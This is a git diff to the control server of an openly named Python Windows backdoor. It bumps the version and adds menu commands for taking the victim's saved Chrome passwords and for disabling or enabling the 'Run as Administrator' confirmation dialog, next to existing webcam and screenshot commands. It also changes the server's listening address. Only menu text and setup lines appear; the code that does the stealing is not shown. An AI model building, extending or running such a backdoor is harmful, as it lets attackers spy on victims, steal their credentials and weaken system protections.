@@ -39,8 +39,8 @@ class server_backdoor:
         \____/ \__,_|\___|_|\_\__,_|\___/ \___/|_|   
                                 (Python-Backdoor)
 
-                                Version 0.3
-                                
+                                Version 0.4
+                                Github: https://github.com/felipecaninnovaes/NinacWindowsBackdoor
                                                         {}\n\n""".format(Fore.BLUE, Fore.RESET))
                 
         except Exception as e:
@@ -147,6 +147,9 @@ class server_backdoor:
         print("Command\t\tDescription\n-------\t\t-----------")
         print("{}\t\t{}".format("webcam", "Get a snap of the webcam."))
         print("{}\t{}".format("screenshot", "Take a screenshot."))
+        print("{}\t{}".format("password", "Get Chrome Passowrd on current user."))
+        print("{}\t{}".format("enableadm", "Enable 'Run as Administrator' dialog confirmation"))
+        print("{}\t{}".format("disableadm", "Disable 'Run as Administrator' dialog confirmation"))
 
         print("\nComputer Information\n====================\n")
         print("Command\t\tDescription\n-------\t\t-----------")
@@ -204,5 +207,5 @@ class server_backdoor:
  
             print(result)
 
-server = server_backdoor("192.168.0.177", 8080)
+server = server_backdoor("192.168.0.76", 8080)
 server.run()
